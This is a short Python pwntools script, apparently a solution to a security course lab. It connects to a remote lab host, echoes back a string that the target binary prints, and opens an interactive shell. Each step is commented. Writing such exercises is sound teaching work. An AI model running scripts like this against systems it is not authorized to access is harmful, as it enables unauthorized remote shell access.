import pwn

if __name__ == "__main__":
    
    # When run, the victim binary prints a string.
    # The binary expects the string to be copied back to it in under a second.
    # I start with running the process.
    process_to_exploit = pwn.remote("csc748.hostbin.org", 7011)
    # This next line can replace the one above for testing against a local binary.
    # process_to_exploit = pwn.process("./lab1-1.bin")

    # I read the introductory text printed to the screen by the binary.
    # This is really just to get it out of the way.
    # Since it's going to be dropped, I don't need to save it to a variable.
    process_to_exploit.recvuntil(b"\n\n")

    # I can now read and save the string given which will win a shell.
    shell_winning_string = process_to_exploit.recv(15)

    # I send the shell winning string back to the binary
    process_to_exploit.sendline(shell_winning_string)

    # I can now drop into a shell.
    process_to_exploit.interactive()